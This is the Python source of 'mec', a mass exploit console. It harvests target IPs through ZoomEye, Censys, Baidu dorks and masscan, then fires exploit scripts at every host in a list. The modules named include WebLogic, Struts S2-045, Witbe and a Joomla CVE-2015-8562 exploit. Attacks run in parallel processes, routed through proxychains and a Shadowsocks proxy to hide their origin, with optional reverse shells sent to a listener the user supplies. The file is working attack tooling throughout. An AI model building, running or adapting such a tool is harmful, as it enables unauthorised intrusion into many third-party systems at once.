#!/usr/bin/python3

'''
mass exploit console
by jm33-ng
'''

import os
import subprocess
import time
import sys

import lib.tools.exploits as exploit_exec
from lib.cli import colors, console
from lib.cli.colors import colored_print
from lib.tools import zoomeye, baidu, censys, scan
from lib.cli.console import debug_except, input_check, check_kill_process


# mec root directory
MECROOT = os.path.join(os.path.expanduser("~"), ".mec")


class SessionParameters():

    '''
    define some global parameters
    '''

    def __init__(self):
        self.init_dir = MECROOT
        self.out_dir = self.init_dir + '/output'
        self.proxy_conf = self.init_dir + \
            '/data/proxy.conf'
        self.use_proxy = True
        self.ip_list = self.init_dir + \
            '/data/ip_list.txt'
        self.proxy_bin = self.init_dir + \
            '/tools/ss-proxy'
        self.ss_config = self.init_dir + \
            '/data/ss.json'
        self.logfile = self.init_dir + \
            '/output/' + \
            time.strftime("%Y_%m_%d_%H_%M_%S.log")


# Needed for scanner session later
SESSION = SessionParameters()


def yes_no(quest):
    '''
    ask a yes_no question
    '''

    res = str(input(quest + " (Yes/no) ")).lower()
    if res in ("yes", "y"):
        return True
    return False


def tail(filepath):
    '''
    tail -f to peek the stdout of your exploit
    '''
    last_lines = ""

    try:
        filed = open(filepath)
        last_lines = ''.join(filed.readlines()[-20:])
        filed.close()
    except IndexError:
        pass
    except BaseException:
        debug_except()

    return last_lines


def list_exp():
    '''
    list all executables under the root of your exploit dir
    '''
    def is_executable(path):
        '''
        check if executable
        '''
        return os.path.isfile(path) and os.access(path, os.X_OK)

    pocs = []  # save poc in a list
    for root, _, files in os.walk('exploits'):
        paths = []
        for filename in files:
            path = './' + root + '/' + filename
            paths.append(path)
        for pathname in paths:
            poc = '/'.join(pathname.split('/')[2:])
            if len(pathname.split('/')) > 4:
                continue
            if is_executable(pathname):
                pocs.append(poc)
    return pocs


def execute(cmd):
    '''
    handles user input in console
    '''

    # lol i don't want any errors here
    cmd = str(cmd).lower().strip()

    if cmd == '':
        return
    if cmd == "masscan":
        # check root, as masscan requires root privilege
        if os.geteuid() != 0:
            console.print_error(
                "[-] Please run mec as root in order to run masscan")
            return

        ports = console.input_check(
            "[?] What ports do you want to scan (eg. 80 443)? ").split()

        try:
            scan.masscan(ports)
        except KeyboardInterrupt:
            console.print_warning("[-] masscan exited")
    elif cmd == 'info':
        colored_print(
            '[*] Current directory: {}\
            \n[*] Init directory: {}\
            \n[*] Log file: {}\
            \n[*] Target: {}\
            \n[*] Proxy config: {}'.format(
                os.getcwd(),
                SESSION.init_dir,
                SESSION.logfile,
                SESSION.ip_list,
                SESSION.proxy_conf),
            colors.CYAN)

    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])
        if target not in os.listdir(SESSION.init_dir + '/data'):
            console.print_error("[-] Target file not found")
            return
        colored_print('[i] Target changed to {}'.format(target), colors.BLUE)
        SESSION.ip_list = SESSION.init_dir + \
            '/data/' + target

    elif cmd in ('init', 'i'):
        colored_print('[*] Going back to init_dir...', colors.BLUE)
        os.chdir(SESSION.init_dir)

    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir(SESSION.out_dir)
            colored_print('[*] Searching on Baidu...', colors.PURPLE)
            baidu.spider(dork, count)

            if yes_no("Use collected URL's as target?"):
                SESSION.ip_list = SESSION.init_dir + "result.txt"

        except (IndexError, EOFError, KeyboardInterrupt, SystemExit):
            return

    elif cmd == 'proxy':
        if not os.path.exists(SESSION.ss_config):
            console.print_error(
                '[-] Please make sure {} exists'.format(SESSION.ss_config))
        try:
            subprocess.Popen(
                [SESSION.proxy_bin,
                 '-c',
                 SESSION.ss_config],
                stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
        except BaseException as err:
            console.print_error(
                '[-] Error starting Shadowsocks proxy: ' + str(err))
            debug_except()

    elif cmd == 'redis':
        console.print_error('[-] Under development')

    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork,
                             '--revshell=\'127.0.0.1\'',
                             '--port=4444'])
        except BaseException as err:
            console.print_error(str(err))
            debug_except()

    elif cmd in ('q', 'quit'):
        check_kill_process('ss-proxy')
        sys.exit(0)

    elif cmd in ('h', 'help', '?'):
        print(console.HELP_INFO)

    elif cmd == 'exploits':
        colored_print('[+] Available exploits: ', colors.CYAN)
        for poc in list_exp():
            colored_print(poc, colors.BLUE)

    elif cmd in ('z', "zoomeye"):
        try:
            console.print_warning(
                "[*] ZoomEye now asks for phone verification (+86 only)")
            zoomeye.run()
        except (EOFError, KeyboardInterrupt, SystemExit):
            pass
        else:
            debug_except()
    elif cmd == "censys":
        try:
            output = censys.start()
            if yes_no("Use collected URL's as target?"):
                SESSION.ip_list = SESSION.init_dir + "/" + output
                colored_print(
                    '[i] Target changed to {}'.format(
                        SESSION.ip_list), colors.BLUE)

        except BaseException:
            return
    elif cmd in ('x', 'reset'):
        os.system("reset")

    elif cmd in ('c', 'clear'):
        os.system("clear")

    elif cmd in ("attack", "e"):
        attack()

    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END,
                colors.GREEN +
                cmd, colors.END)
            os.system(cmd)
        except (EOFError, KeyboardInterrupt, SystemExit):
            return


def attack():
    '''
    handles attack command
    '''
    SESSION.use_proxy = input_check(
        '[?] Do you wish to use proxychains? [y/n] ',
        choices=['y', 'n']) == 'y'
    if SESSION.use_proxy:
        import shutil
        if shutil.which("proxychains4") is None:
            console.print_error("proxychains4 not found")
            return
        execute("proxy")
    answ = input_check(
        '\n[?] Do you wish to use\
        \n\n    [a] built-in exploits\
        \n    [m] or launch your own manually?\
        \n\n[=] Your choice: ',
        choices=['a', 'm'])
    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.BUILT_IN)
        answ = input_check(
            '[=] Your choice: ',
            check_type=int,
            choices=['0',
                     '1',
                     '2',
                     '3',
                     '4'])

        try:
            if answ == '2':
                console.print_error("\n[-] Under development")
            elif answ == '1':
                console.print_error('\n[-] Under development')
            elif answ == '0':
                scanner(exploit_exec.weblogic())
            elif answ == '3':
                scanner(exploit_exec.s2_045())
            elif answ == '4':
                scanner(exploit_exec.witbe())

        except (EOFError, KeyboardInterrupt, SystemExit):
            return

    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, in here you can choose your own exploit\n" +
            colors.END)
        colored_print('[*] Here are available exploits:\n', colors.CYAN)

        for poc in list_exp():
            colored_print(poc + colors.END, colors.BLUE)

        exploit = input_check(
            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ",
            choices=list_exp())

        jobs = int(
            input_check("[?] How many processes each time? ", check_type=int))

        custom_args = []
        answ = input_check(
            "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
        if answ == 'y':
            lhost = input(
                "[*] Where do you want me to send shells? ").strip()
            lport = input_check(
                "[*] and at what port?",
                check_type=int)
            custom_args = ['-l', lhost, '-p', lport]
        else:
            pass

        custom_args += input(
            "[*] args for this exploit").strip().split()

        # parse user's exploit name
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        exec_path = '/'.join(exec_path)
        work_path = '/'.join(work_path)

        # let user check if there's anything wrong
        print(
            colors.BLUE +
            '[*] Your exploit will be executed like\n' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            ' '.join(custom_args))

        # args as parameter for scanner
        scanner_args = console.ScannerArgs(work_path, exec_path,
                                           custom_args,
                                           jobs)
        # start scanner
        scanner(scanner_args)

    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    '''
    Execute exploit against given ip list
    '''

    # looks ugly, but since it works well, im not planning a rewrite
    work_path, exec_path = scanner_args.work_path, scanner_args.exec_path
    custom_args, jobs = scanner_args.custom_args, scanner_args.jobs

    if SESSION.use_proxy:
        e_args = [
            'proxychains4',
            '-q',
            '-f',
            SESSION.proxy_conf,
            './' + exec_path]
    else:
        e_args = ['./' + exec_path]

    # add custom arguments for different exploits
    e_args += custom_args
    # the last argument is target host
    e_args += ['-t']

    try:
        target_list = open(SESSION.ip_list)
    except BaseException as exc:
        console.print_error('[-] Error occured: {}\n'.format(exc))
        debug_except()
        return

    try:
        os.chdir('./exploits/' + work_path)
    except FileNotFoundError:
        console.print_error("[-] Can't chdir to " + work_path)
        debug_except()
    console.print_warning(
        '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())

    # you might want to cancel the scan to correct some errors
    if input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
        return

    # save stdout to logfile
    try:
        logfile = open(SESSION.logfile, "a+")
    except FileNotFoundError:
        console.print_error("[-] Log file not found")

    # needed for the loop
    procs = []
    count = len(procs)

    # display help for viewing logs
    print(colors.CYAN +
          "[*] Use `tail -f {}` to view logs\n\n".format(SESSION.logfile))

    # use progress bar
    import tqdm
    with open(SESSION.ip_list) as iplistf:
        total = len([0 for _ in iplistf])
        iplistf.close()
    pbar = tqdm.tqdm(total=total, ncols=80, desc="[*] Processing targets")

    for line in target_list:
        target_ip = line.strip()

        # mark this loop as done
        count = len(procs)

        try:
            # start and display current process
            e_args += [target_ip]

            proc = subprocess.Popen(e_args, stdout=logfile, stderr=logfile)
            procs.append(proc)
            pbar.set_description(desc="[*] Processing {}".format(target_ip))
            pbar.update(1)

            # continue to next target
            e_args.remove(target_ip)
            time.sleep(.11)

            # process pool
            if count == jobs:
                for item in procs:
                    if item.returncode is None:
                        try:
                            item.communicate(timeout=1)
                        except subprocess.TimeoutExpired:
                            item.kill()
                procs = []

        except (EOFError, KeyboardInterrupt, SystemExit):
            for item in procs:
                if item.pid is not None:
                    item.kill()
            logfile.close()
            pbar.close()
            console.print_error("[-] Task aborted")
            os.chdir(SESSION.init_dir)

            # killall running processes
            check_kill_process(exec_path)
            return

        except BaseException as exc:
            console.print_error("[-] Exception: {}\n".format(str(exc)))
            logfile.write("[-] Exception: " + str(exc) + "\n")

    # close logfile, exit curses window, and print done flag
    logfile.close()
    pbar.close()
    os.chdir(SESSION.init_dir)
    console.print_success('\n[+] All done!\n')


def main():
    '''
    handles user interface
    '''

    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()
    if answ.lower() == 'n':
        os.system("ls ~/.mec/data")
        SESSION.ip_list = SESSION.init_dir + '/data/' + \
            input_check(
                '[=] Choose your target IP list, eg. ip_list.txt ',
                choices=os.listdir(MECROOT + '/data'))

    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                colors.UNDERLINE +
                "\nmec" +
                colors.END +
                colors.CYAN +
                colors.BOLD +
                " > " +
                colors.END)

            try:
                execute(cmd)
            except (KeyboardInterrupt, EOFError, SystemExit):
                sys.exit(0)

        except KeyboardInterrupt:

            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                check_kill_process('ss-proxy')
                sys.exit(0)

            if answ.lower() == 'y':
                check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue


def run():
    '''
    start mec
    '''
    try:
        os.system('clear')
        print(console.INTRO)
        os.chdir(MECROOT)
        main()
    except (EOFError, KeyboardInterrupt, SystemExit):
        console.print_error('[-] Exiting...')
    except FileNotFoundError:
        debug_except()
        console.print_error("[-] Please run install.py first")
        sys.exit(1)
    else:
        console.print_error(
            "[-] Seems like you\'ve encountered an unhandled exception")
        debug_except()
